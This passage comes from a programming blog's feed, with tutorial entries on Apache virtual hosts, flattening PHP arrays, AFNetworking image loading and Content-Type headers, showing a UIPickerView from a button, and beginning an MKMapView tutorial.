class="line">192.168.1.12 local.bar.com</span><br></pre></td></tr></table></figure><p><em>(<code>local.foo.com</code> and <code>local.bar.com</code> is <code>ServerAlias</code>)</em></p><h2 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h2><p>For <code>Machine B</code>, open up the browser, and type in the URL <strong>local.foo.com</strong> will see the <code>foo</code> site; and <strong>local.bar.com</strong> will see the <code>bar</code> site.</p><p>Reference: <a href="http://stackoverflow.com/questions/7141634/apache-virtual-host-subdomain-access-with-different-computer-on-lan/7146132#7146132">Apache Virtual Host (Subdomain) access with different computer on LAN</a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;Environment&quot;&gt;&lt;a href=&quot;#Environment&quot; class=&quot;headerlink&quot; title=&quot;Environment&quot;&gt;&lt;/a&gt;Environment&lt;/h2&gt;&lt;p&gt;This is tested on Ubuntu 13.04</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="configuration" scheme="http://jslim.net/tags/configuration/"/>
    
    <category term="apache" scheme="http://jslim.net/tags/apache/"/>
    
  </entry>
  
  <entry>
    <title>PHP - Restructure multi-dimentional array into single dimention</title>
    <link href="http://jslim.net/blog/2013/12/13/php-restructure-multi-dimentional-array-into-single-dimention/"/>
    <id>http://jslim.net/blog/2013/12/13/php-restructure-multi-dimentional-array-into-single-dimention/</id>
    <published>2013-12-13T09:08:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><p>For example, we have array like this</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;test_1&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;msg_1&#x27;</span> =&gt; <span class="string">&#x27;this is the first desc&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;msg_2&#x27;</span> =&gt; <span class="string">&#x27;this is the second desc&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">&#x27;test_2&#x27;</span> =&gt; <span class="string">&#x27;this is the third desc&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;test_3&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;msg_1&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;foo_1&#x27;</span> =&gt; <span class="string">&#x27;this is the fourth desc&#x27;</span>,</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&#x27;msg_2&#x27;</span> =&gt; <span class="string">&#x27;this is the fifth desc&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">&#x27;this is the sixth desc&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="Desired-result"><a href="#Desired-result" class="headerlink" title="Desired result"></a>Desired result</h2><p>What we want the output is</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line"><span class="string">    [0]</span> =&gt; <span class="keyword">this</span> <span class="keyword">is</span> the first desc</span><br><span class="line"><span class="string">    [1]</span> =&gt; <span class="keyword">this</span> <span class="keyword">is</span> the second desc</span><br><span class="line"><span class="string">    [2]</span> =&gt; <span class="keyword">this</span> <span class="keyword">is</span> the third desc</span><br><span class="line"><span class="string">    [3]</span> =&gt; <span class="keyword">this</span> <span class="keyword">is</span> the fourth desc</span><br><span class="line"><span class="string">    [4]</span> =&gt; <span class="keyword">this</span> <span class="keyword">is</span> the fifth desc</span><br><span class="line"><span class="string">    [5]</span> =&gt; <span class="keyword">this</span> <span class="keyword">is</span> the sixth desc</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="Source-code"><a href="#Source-code" class="headerlink" title="Source code"></a>Source code</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">restructure_array</span>(<span class="params"><span class="variable">$obj</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$obj</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="variable">$obj</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$single_array</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$obj</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$sub_obj</span>) &#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="title function_ invoke__">restructure_array</span>(<span class="variable">$sub_obj</span>);</span><br><span class="line">        <span class="variable">$single_array</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$single_array</span>, <span class="variable">$tmp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$single_array</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;Source&quot;&gt;&lt;a href=&quot;#Source&quot; class=&quot;headerlink&quot; title=&quot;Source&quot;&gt;&lt;/a&gt;Source&lt;/h2&gt;&lt;p&gt;For example, we have array like this&lt;/p&gt;
&lt;figure</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Problem with AFImageRequestOperation block not executed</title>
    <link href="http://jslim.net/blog/2013/11/15/problem-with-afimagerequestoperation-block-not-executed/"/>
    <id>http://jslim.net/blog/2013/11/15/problem-with-afimagerequestoperation-block-not-executed/</id>
    <published>2013-11-15T03:59:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Recently I’ve faced a weird bug about displaying image from URL to <code>UIImageView</code>. Finally I found out is the <strong>header</strong> issue.</p><p>Let’s take an example, there are 2 images</p><ul><li><a href="http://example.com/image1.jpg">http://example.com/image1.jpg</a></li><li><a href="http://example.com/image2.jpg">http://example.com/image2.jpg</a></li></ul><p><strong>Image1</strong> has the header</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HTTP</span> <span class="number">200</span> No Error</span><br><span class="line"></span><br><span class="line"><span class="attribute">Server</span>: AmazonS3</span><br><span class="line"><span class="attribute">Content</span>-Type: binary/octet-stream</span><br><span class="line"><span class="attribute">Last</span>-Modified: Mon, <span class="number">01</span> Jul <span class="number">2013</span> <span class="number">03</span>:<span class="number">06</span>:<span class="number">03</span> GMT</span><br><span class="line"><span class="attribute">x</span>-amz-meta-type: image/jpeg</span><br><span class="line"><span class="attribute">x</span>-amz-request-id: <span class="number">8845</span>F67C90997FF6</span><br><span class="line"><span class="attribute">Date</span>: Fri, <span class="number">15</span> Nov <span class="number">2013</span> <span class="number">04</span>:<span class="number">02</span>:<span class="number">30</span> GMT</span><br><span class="line"><span class="attribute">x</span>-amz-id-<span class="number">2</span>: F9crPjTya1RNjUeaNLkE2cQTOet8WnAk72idgXeXBIglwwxHLVBvWbL67IC4Brkm</span><br><span class="line"><span class="attribute">Accept</span>-Ranges: bytes</span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">127456</span></span><br><span class="line"><span class="attribute">Etag</span>: <span class="string">&quot;545ccc75ee7fc045ed201092742af52e&quot;</span></span><br></pre></td></tr></table></figure><p><strong>Image2</strong> has the header</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HTTP</span> <span class="number">200</span> No Error</span><br><span class="line"></span><br><span class="line"><span class="attribute">Server</span>: Microsoft-IIS/<span class="number">8</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Content</span>-Type: image/jpeg</span><br><span class="line"><span class="attribute">X</span>-Powered-By: ASP.NET</span><br><span class="line"><span class="attribute">Last</span>-Modified: Thu, <span class="number">24</span> Oct <span class="number">2013</span> <span class="number">21</span>:<span class="number">41</span>:<span class="number">42</span> GMT</span><br><span class="line"><span class="attribute">Accept</span>-Ranges: bytes</span><br><span class="line"><span class="attribute">Date</span>: Fri, <span class="number">15</span> Nov <span class="number">2013</span> <span class="number">04</span>:<span class="number">07</span>:<span class="number">30</span> GMT</span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">60585</span></span><br><span class="line"><span class="attribute">Etag</span>: <span class="string">&quot;16e91dd41d1ce1:0&quot;</span></span><br></pre></td></tr></table></figure><p>Look at the <code>Content-Type</code>, <strong>Image1</strong> with the <code>Content-Type</code> <strong>binary/octet-stream</strong> <em>(if you type the URL in browser it will force download)</em>, while <code>Content-Type</code> of <strong>Image2</strong> is <strong>image/jpeg</strong> <em>(it will display in browser if you type in the URL)</em>.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>I make a plain HTTP request</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NSString</span> *url = <span class="string">@&quot;http://example.com/image1.jpg&quot;</span>;</span><br><span class="line">AFHTTPClient *httpClient = [[AFHTTPClient alloc] initWithBaseURL:[<span class="built_in">NSURL</span> URLWithString:url]];</span><br><span class="line">[httpClient setParameterEncoding:AFFormURLParameterEncoding];</span><br><span class="line"></span><br><span class="line"><span class="built_in">NSURLRequest</span> *request = [httpClient requestWithMethod:<span class="string">@&quot;GET&quot;</span></span><br><span class="line">                                                 path:url</span><br><span class="line">                                           parameters:<span class="literal">nil</span>];</span><br><span class="line"></span><br><span class="line">AFHTTPRequestOperation *operation = [[AFHTTPRequestOperation alloc] initWithRequest:request];</span><br><span class="line">[operation setCompletionBlockWithSuccess:^(AFHTTPRequestOperation *operation, <span class="type">id</span> responseObject) &#123;</span><br><span class="line">    <span class="built_in">UIImage</span> *image = [<span class="built_in">UIImage</span> imageWithData:responseObject];</span><br><span class="line">    imageView.image = image;</span><br><span class="line">&#125; failure:^(AFHTTPRequestOperation *operation, <span class="built_in">NSError</span> *error) &#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;Error: %@&quot;</span>, error.description);</span><br><span class="line">&#125;];</span><br><span class="line">[operation start];</span><br></pre></td></tr></table></figure><p>instead of <em>(this will only work for <code>Content-Type: image/jpeg</code>)</em></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NSString</span> *url = <span class="string">@&quot;http://example.com/image1.jpg&quot;</span>;</span><br><span class="line">[[AFImageRequestOperation imageRequestOperationWithRequest:[<span class="built_in">NSURLRequest</span> requestWithURL:[<span class="built_in">NSURL</span> URLWithString:url]] success:^(<span class="built_in">UIImage</span> *image) &#123;</span><br><span class="line">    imageView.image = image;</span><br><span class="line">&#125;] start];</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Recently I’ve faced a weird bug about displaying image from URL to &lt;code&gt;UIImageView&lt;/code&gt;. Finally I found out is the</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Bring up UIPickerView when clicked on UIButton</title>
    <link href="http://jslim.net/blog/2013/10/16/bring-up-uipickerview-when-clicked-on-uibutton/"/>
    <id>http://jslim.net/blog/2013/10/16/bring-up-uipickerview-when-clicked-on-uibutton/</id>
    <published>2013-10-16T05:51:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>We don’t add UIPickerView as subview. There is a trick to achieve this.</p><h3 id="Create-a-dummy-UITextField"><a href="#Create-a-dummy-UITextField" class="headerlink" title="Create a dummy UITextField"></a>Create a dummy UITextField</h3><p>This text field is not visible to user, is a hidden field</p><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;ViewController.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ViewController</span> ()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">UITextField</span> *pickerViewTextField;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">ViewController</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@synthesize</span> pickerViewTextField = _pickerViewTextField;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)viewDidLoad</span><br><span class="line">&#123;</span><br><span class="line">    [<span class="variable language_">super</span> viewDidLoad];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set the frame to zero</span></span><br><span class="line">    <span class="keyword">self</span>.pickerViewTextField = [[<span class="built_in">UITextField</span> alloc] initWithFrame:<span class="built_in">CGRectZero</span>];</span><br><span class="line">    [<span class="keyword">self</span>.view addSubview:<span class="keyword">self</span>.pickerViewTextField];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">UIPickerView</span> *pickerView = [[<span class="built_in">UIPickerView</span> alloc] initWithFrame:<span class="built_in">CGRectMake</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)];</span><br><span class="line">    pickerView.showsSelectionIndicator = <span class="literal">YES</span>;</span><br><span class="line">    pickerView.dataSource = <span class="keyword">self</span>;</span><br><span class="line">    pickerView.delegate = <span class="keyword">self</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// set change the inputView (default is keyboard) to UIPickerView</span></span><br><span class="line">    <span class="keyword">self</span>.pickerViewTextField.inputView = pickerView;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// add a toolbar with Cancel &amp; Done button</span></span><br><span class="line">    <span class="built_in">UIToolbar</span> *toolBar = [[<span class="built_in">UIToolbar</span> alloc] initWithFrame:<span class="built_in">CGRectMake</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">320</span>, <span class="number">44</span>)];</span><br><span class="line">    toolBar.barStyle = <span class="built_in">UIBarStyleBlackOpaque</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">UIBarButtonItem</span> *doneButton = [[<span class="built_in">UIBarButtonItem</span> alloc] initWithBarButtonSystemItem:<span class="built_in">UIBarButtonSystemItemDone</span> target:<span class="keyword">self</span> action:<span class="keyword">@selector</span>(doneTouched:)];</span><br><span class="line">    <span class="built_in">UIBarButtonItem</span> *cancelButton = [[<span class="built_in">UIBarButtonItem</span> alloc] initWithBarButtonSystemItem:<span class="built_in">UIBarButtonSystemItemCancel</span> target:<span class="keyword">self</span> action:<span class="keyword">@selector</span>(cancelTouched:)];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// the middle button is to make the Done button align to right</span></span><br><span class="line">    [toolBar setItems:[<span class="built_in">NSArray</span> arrayWithObjects:cancelButton, [[<span class="built_in">UIBarButtonItem</span> alloc] initWithBarButtonSystemItem:<span class="built_in">UIBarButtonSystemItemFlexibleSpace</span> target:<span class="literal">nil</span> action:<span class="literal">nil</span>], doneButton, <span class="literal">nil</span>]];</span><br><span class="line">    <span class="keyword">self</span>.pickerViewTextField.inputAccessoryView = toolBar;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Trigger-the-picker-view-when-click-on-UIButton"><a href="#Trigger-the-picker-view-when-click-on-UIButton" class="headerlink" title="Trigger the picker view when click on UIButton"></a>Trigger the picker view when click on UIButton</h3><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">- (<span class="keyword">IBAction</span>)someButtonTouched:(<span class="built_in">UIButton</span> *)sender</span><br><span class="line">&#123;</span><br><span class="line">    [<span class="keyword">self</span>.pickerViewTextField becomeFirstResponder];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Add-methods-for-bar-buttons"><a href="#Add-methods-for-bar-buttons" class="headerlink" title="Add methods for bar buttons"></a>Add methods for bar buttons</h3><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)cancelTouched:(<span class="built_in">UIBarButtonItem</span> *)sender</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// hide the picker view</span></span><br><span class="line">    [<span class="keyword">self</span>.pickerViewTextField resignFirstResponder];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)doneTouched:(<span class="built_in">UIBarButtonItem</span> *)sender</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// hide the picker view</span></span><br><span class="line">    [<span class="keyword">self</span>.pickerViewTextField resignFirstResponder];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// perform some action</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Add-dataSource-amp-delegate-for-UIPickerView"><a href="#Add-dataSource-amp-delegate-for-UIPickerView" class="headerlink" title="Add dataSource &amp; delegate for UIPickerView"></a>Add dataSource &amp; delegate for UIPickerView</h3><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - UIPickerViewDataSource</span></span><br><span class="line">- (<span class="built_in">NSInteger</span>)numberOfComponentsInPickerView:(<span class="built_in">UIPickerView</span> *)pickerView</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="built_in">NSInteger</span>)pickerView:(<span class="built_in">UIPickerView</span> *)pickerView numberOfRowsInComponent:(<span class="built_in">NSInteger</span>)component</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [yourItems count];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - UIPickerViewDelegate</span></span><br><span class="line">- (<span class="built_in">NSString</span> *)pickerView:(<span class="built_in">UIPickerView</span> *)pickerView titleForRow:(<span class="built_in">NSInteger</span>)row forComponent:(<span class="built_in">NSInteger</span>)component</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSString</span> *item = [yourItems objectAtIndex:row];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)pickerView:(<span class="built_in">UIPickerView</span> *)pickerView didSelectRow:(<span class="built_in">NSInteger</span>)row inComponent:(<span class="built_in">NSInteger</span>)component</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// perform some action</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Don’t forget to make your <code>ViewController</code> conform to the protocols</p><p><strong>ViewController.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ViewController</span> : <span class="title">UIViewController</span> &lt;<span class="title">UIPickerViewDataSource</span>, <span class="title">UIPickerViewDelegate</span>&gt;</span></span><br></pre></td></tr></table></figure><p>You’re done :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;We don’t add UIPickerView as subview. There is a trick to achieve this.&lt;/p&gt;
&lt;h3 id=&quot;Create-a-dummy-UITextField&quot;&gt;&lt;a</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>iOS - Working with MKMapView</title>
    <link href="http://jslim.net/blog/2013/10/09/ios-working-with-mkmapview/"/>
    <id>http://jslim.net/blog/2013/10/09/ios-working-with-mkmapview/</id>
    <published>2013-10-09T03:45:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Here I want to discuss about using <strong>map</strong> in iOS application</p><h3 id="First-import-MapKit"><a href="#First-import-MapKit" class="headerlink" title="First, import MapKit"></a>First, import <code>MapKit</code></h3><p><strong>ViewController.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&lt;MapKit/MapKit.h&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="Then-make-sure-your-ViewController-conform-to-MKMapViewDelegate"><a href="#Then-make-sure-your-ViewController-conform-to-MKMapViewDelegate" class="headerlink" title="Then make sure your ViewController conform to MKMapViewDelegate"></a>Then make sure your <code>ViewController</code> conform to <code>MKMapViewDelegate</code></h3><p><strong>ViewController.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ViewController</span> : <span class="title">UIViewController</span> &lt;<span class="title">MKMapViewDelegate</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">MKMapView</span> *mapView;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><h3 id="In-your-ViewController-m-create-and-place-the-map-in-ViewController"><a href="#In-your-ViewController-m-create-and-place-the-map-in-ViewController" class="headerlink" title="In your ViewController.m, create and place the map in ViewController"></a>In your <code>ViewController.m</code>, create and place the map in <code>ViewController</code></h3><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">- (<span class="type">void</span>)viewDidLoad</span><br><span class="line">&#123;</span><br><span class="line">    [<span class="variable language_">super</span> viewDidLoad];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">self</span>.mapView = [[<span class="built_in">MKMapView</span> alloc] initWithFrame:<span class="built_in">CGRectMake</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">320</span>, <span class="number">200</span>)];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// don&#x27;t miss this</span></span><br><span class="line">    <span class="keyword">self</span>.mapView.delegate = <span class="keyword">self</span>;</span><br><span class="line">    <span class="comment">// if you want it to show user&#x27;s current location</span></span><br><span class="line">    <span class="keyword">self</span>.mapView.showsUserLocation = <span class="literal">YES</span>;</span><br><span class="line">    [<span class="keyword">self</span>.view addSubview:<span class="keyword">self</span>.mapView];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Remember-to-create-a-custom-object-the-conform-to-MKAnnotation-lets-call-it-MyPlace"><a href="#Remember-to-create-a-custom-object-the-conform-to-MKAnnotation-lets-call-it-MyPlace" class="headerlink" title="Remember to create a custom object the conform to MKAnnotation, lets call it MyPlace"></a>Remember to create a custom object the conform to <code>MKAnnotation</code>, lets call it <code>MyPlace</code></h3><p><strong>MyPlace.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">MyPlace</span> : <span class="title">NSObject</span> &lt;<span class="title">MKAnnotation</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSString</span> *placeName;</span><br><span class="line"></span><br><span class="line">- (<span class="type">id</span>)initWithJSON:(<span class="type">id</span>)json;</span><br><span class="line"></span><br><span class="line"><span class="comment">// must implement this if want to make the Pin draggable</span></span><br><span class="line">- (<span class="type">void</span>)setCoordinate:(<span class="built_in">CLLocationCoordinate2D</span>)coordinate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p><strong>MyPlace.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;MyPlace.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">MyPlace</span> ()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@property</span> 